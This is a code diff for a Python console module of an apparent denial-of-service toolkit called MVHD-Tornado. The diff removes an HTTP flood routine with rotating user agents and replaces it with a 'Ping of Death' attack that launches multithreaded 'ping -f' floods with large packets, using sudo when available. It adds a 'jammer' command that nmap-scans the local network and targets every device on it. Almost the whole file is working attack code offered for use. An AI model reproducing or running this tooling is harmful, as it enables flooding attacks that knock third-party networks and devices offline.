@@ -1,13 +1,24 @@
-import urllib.request
+import socket
 from os import getcwd, name, path, system
-from random import choice, randint
 from sys import version
 from threading import Thread
 from time import sleep
 
 import requests
-from CLIF_Framework.framework import event  # noqa: I900
-from CLIF_Framework.framework import tools  # noqa: I900
+from CLIF_Framework.framework import event, tools  # noqa: I900
+
+try:
+	from os import geteuid
+
+	geteuid_exists = True
+except ImportError:
+	geteuid_exists = False
+
+try:
+	import nmap
+except Exception as e:
+	print("Please install following module:", e)
+	quit()
 
 event = event()
 tools = tools()
@@ -30,16 +41,16 @@ class Main:
 		var.C_Dark_Blue = "\x1b[35m"
 		var.C_Red = "\x1b[31m"
 
-		var.target = [""]
-		var.threads = 400
+		var.nm = None
+		var.nmapinstalled = False
+		var.target = ""
+		var.size = 65500
+		var.threads = 30
 		var.sleep = 0
 		var.interval = 0
-		var.run_active = True
+		var.auto_stop = 0
 
-		var.l7_debug = False
-		var.stoped_threads = 0
-
-		var.user_agents = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)", "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; pl-pl) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246", "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00", "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00", "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36", "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; ru; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-gb) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)", "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0", "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)", "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01", "Mozilla/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; ru-ru) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-tw) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5"]
+		var.l3_debug = False
 
 	def _add_commands(self):
 		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
@@ -53,11 +64,13 @@ class Main:
 
 		event.help("target", "Set the target.")
 		event.help("targets", "Set multiple targets.")
-		event.help("threads", "Amount of threads to use.")
+		event.help("size", "Set packet size.")
+		event.help("threads", "Threads to use.")
 		event.help("sleep", "Delay between threads.")
 		event.help("interval", "Delay between each packet send.")
-		event.help("agent", "Define a user agent instead of a random ones.")
-		event.help("run", "Run the stress test.")
+		event.help("auto stop", "Automatically stop attack after x seconds.")
+		event.help("run", "Run the Ping of Death.")
+		event.help("jammer", "Kill a whole wifi network, by targeting all.")
 
 	def banner(self):
 		system("clear || cls")
@@ -72,6 +85,15 @@ DEFFINITIFLY POSSIBLE.
 MVHD-TORNADO SHOULD NOT SUGGEST PEOPLE TO PERFORM ILLEGAL ACTIVITIES.
 C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
 		self.help()
+		if not geteuid_exists:
+			print("")
+			print("I am sorry, but this feature is currently not supported on stock Windows, try running it using wsl.")
+			print("You will be redirected to the main menu.")
+			print("")
+			input("[Press Enter]")
+			print("")
+			var.stop()
+			return
 
 	def exit_console(self):
 		print("Have a nice day.")
@@ -80,6 +102,49 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def run_shell(self, command):
 		print("")
 		system(tools.arg("Enter shell command: ", ". ", command))
+		print("")
+
+	def debug(self, command):
+		print("")
+		eval(tools.arg("Enter debug command: ", "$ ", command))
+		print("")
+
+	@event.command
+	def clear():
+		system("clear || cls")
+
+	@event.event
+	def on_ready():
+		try:
+			var.nm = nmap.PortScanner()
+			var.nmapinstalled = True
+		except Exception as e:
+			system("clear || cls")
+			print("Please install the nmap package.")
+			print("Some functions will not work without it.")
+			print(e)
+			try:
+				input("[Press enter to continue without nmap]")
+				print("")
+			except Exception:
+				quit()
+
+		try:
+			if geteuid() != 0:
+				print("It is adviced to run the l3 attack with sudo privileges")
+				try:
+					input("[Press enter to continue without sudo]")
+				except Exception:
+					quit()
+		except Exception:
+			pass
+
+		self.banner()
+
+	@event.event
+	def on_command_not_found(command):
+		print("")
+		print("The command you entered does not exist.")
 		print("")
 
 	def check_session(self):
@@ -107,31 +172,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				else:
 					sleep(1)
 
-	def debug(self, command):
-		print("")
-		eval(tools.arg("Enter debug command: ", "$ ", command))
-		print("")
-
-	@event.command
-	def clear():
-		system("clear || cls")
-
 	@event.event
-	def on_ready():
-		self.banner()
-
-	@event.command
-	def debug():
-		var.l7_debug = True
+	def on_interrupt():
 		print("")
-		print("Debugging mode enabled.")
-		print("")
-
-	@event.event
-	def on_command_not_found(command):
-		print("")
-		print("The command you entered does not exist.")
-		print("")
+		var.stop()
 
 	@event.event
 	def on_command(command):
@@ -144,42 +188,59 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				print("An error occured, while sending commands to the server.")
 				print("")
 
-	@event.event
-	def on_interrupt():
+	@event.command
+	def debug():
+		var.l3_debug = True
 		print("")
-		var.stop()
+		print("Debugging mode enabled.")
+		print("")
 
 	def show_values(self):
 		print("")
 		print("Targets: %s" % var.target)
+		print("Packet Size: %s" % var.size)
 		print("Threads: %s" % var.threads)
 		print("Delay between threads: %s" % var.sleep)
 		print("Delay between packets: %s" % var.interval)
-		if len(var.user_agents) == 1:
-			print("User Agent: %s" % var.user_agents[0])
+		print("Time to auto stop: %s" % var.auto_stop)
 		print("")
 
 	def help(self):
-		event.help_title("\x1b[1;39mL7 Help:\x1b[0;39m")
+		event.help_title("\x1b[1;39mPoD Help:\x1b[0;39m")
 		tools.help("|-- ", " :: ", event)
 		print("")
 
 	@event.command
 	def targets(command):
 		print("")
-		var.target = tools.arg("URLS (Seperated by ', '): ", "targets ", command).split(", ")
-		for url in var.target:
-			if "http" not in url:
-				print("%s is a invalid URL." % url)
+		var.target = tools.arg("Targets (Seperated by ', '): ", "targets ", command).split(", ")
+		for ip in var.target:
+			if "." not in ip:
+				print("This IP does not exist.")
 		print("")
 
 	@event.command
 	def target(command):
 		print("")
-		var.target = [tools.arg("URL (GET Parameters possible): ", "target ", command)]
-		if "http" not in var.target[0]:
-			print("This URL is invalid.")
+		var.target = tools.arg("Target: ", "target ", command)
+		if "." not in var.target:
+			print("This IP does not exist.")
 		print("")
+
+	@event.command
+	def size(command):
+		print(" ")
+		try:
+			sizezw = int(tools.arg("Size in kb: ", "size ", command))
+			if sizezw < 5:
+				print("Size needs to be more than 4kb.")
+			elif sizezw > 65500:
+				print("Size needs to be less than 65500kb.")
+			else:
+				var.size = sizezw
+		except Exception as e:
+			print("There was an error while executing.", e)
+		print(" ")
 
 	@event.command
 	def threads(command):
@@ -209,57 +270,93 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print(" ")
 
 	@event.command
-	def agent(command):
+	def auto_stop(command):
 		print(" ")
-		var.user_agents = [tools.arg("Enter a user agent: ", "agent ", command)]
+		try:
+			var.auto_stop = int(tools.arg("Time until auto stop: ", "auto stop ", command))
+		except Exception as e:
+			print("There was an error while executing.", e)
 		print(" ")
 
-	def ddos(self):
-		while var.run_active:
-			for url in var.target:
-				try:
-					response = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': choice(var.user_agents), "Connection": "keep-alive", "Accept-Encoding": "gzip, deflate", "Keep-Alive": randint(110,120)}), timeout=999)  # noqa
-					var.command_log.append("Sucessful execution.")
-				except Exception as ex:
-					print("Request failed.")
-					var.command_log.append("ERROR: %s" % ex)
-					if var.l7_debug:
-						print("ERROR: %s" % ex)
-				print("Request received.")
-			sleep(var.interval)
-		var.stoped_threads += 1
+	@event.command
+	def jammer():
+		print(" ")
+		try:
+			gateways = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			gateways.connect(("8.8.8.8", 80))
+			gateway = ".".join((gateways.getsockname()[0].split("."))[:len(gateways.getsockname()[0].split(".")) - 1])
+			localip = gateways.getsockname()[0]
+			gateways.close()
+			var.nm.scan(hosts=("%s.0/24" % gateway), arguments="-sP")
+			lanscandev = [(x) for x in var.nm.all_hosts()]
+			var.target = []
+			for lanscandevice in lanscandev:
+				if lanscandevice != localip and lanscandevice != ("%s.1" % gateway):
+					var.target.append(lanscandevice)
+			print("All devices in Internet are now targeted.", var.target)
+		except Exception as e:
+			if not var.nmapinstalled:
+				print("Please install nmap to continue.")
+			else:
+				print("There was an error while executing.", e)
+		print(" ")
+
+	def pod(self, size, target, threads, threadssleep, podinterval, podautodl):
+		print(("Starting attack...\nC_B[Hit ENTER or CTRL + C to stop the attack]\nC_W").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
+		targets = []
+		feat = ""
+		if podinterval != 0:
+			feat += ("-i %s " % podinterval)
+		if podautodl != 0:
+			feat += ("-w %s " % podautodl)
+		if isinstance(target, list):
+			targets = target
+		else:
+			targets = [target]
+		del(target)
+		if var.l3_debug:
+			output_to_dev_null = ""
+		else:
+			output_to_dev_null = "> /dev/null "
+		for target in targets:
+			if geteuid() == 0:
+				print(("Running thread C_BwithC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
+				killcom = ('sudo ping -f -q -s %s %s %s %s& ' % (size, feat, target, output_to_dev_null)).replace("  ", " ")
+			else:
+				print(("Running thread C_BwithoutC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
+				killcom = ("ping -q -s %s %s %s %s& " % (size, feat, target, output_to_dev_null)).replace("  ", " ")
+			try:
+				for i in range(int(threads)):
+					system(killcom)
+					sleep(float(threadssleep))
+			except KeyboardInterrupt:
+				system("killall -SIGINT ping")
+				print("Attack abort.")
+			except Exception as pingerror:
+				var.command_log.append("ERROR: %s" % pingerror)
+				print("An error was caught while executing.", pingerror)
+				system("killall -SIGINT ping")
+				print("Attack abort.")
+			try:
+				input("")
+				system("killall -SIGINT ping")
+				print("Attack abort.")
+			except Exception:
+				system("killall -SIGINT ping")
+				print("Attack abort.")
+			print("Attack abort.")
 
 	@event.command
 	def run():
 		def execute():
-			print("")
-			print("To stop the attack press: ENTER or CTRL + C")
-			print("")
-
-			var.ps1 = ""  # Change due to threading bug.
-
-			sleep(3)
-			for thread in range(var.threads):
-				try:
-					t = Thread(target=self.ddos)
-					t.start()
-					sleep(var.sleep)
-				except Exception:
-					print("Could not start thread %s." % thread)
+			self.pod(var.size, var.target, var.threads, var.sleep, var.interval, var.auto_stop)
 
 			def reset_attack():
 				print("Stopping threads...")
-				var.run_active = False
-				sleep(2)
-				while True:
-					if var.stoped_threads == var.threads:
-						break
-					else:
-						sleep(1)
-
-				if var.l7_debug:
+				system("killall ping")
+				if var.l3_debug:
 					print("Saving debugging log...")
-					output_to = path.join(getcwd(), "l7_debug_log.txt")
+					output_to = path.join(getcwd(), "l3_debug_log.txt")
 
 					write_method = "a"
 					if path.isfile(output_to):
@@ -334,5 +431,5 @@ C_B----------------------------------------------------------C_W""").replace("C_
 
 
 def setup(console):
-	console.ps1 = "L7> "
+	console.ps1 = "L3> "
 	console.add(Main(console), event)
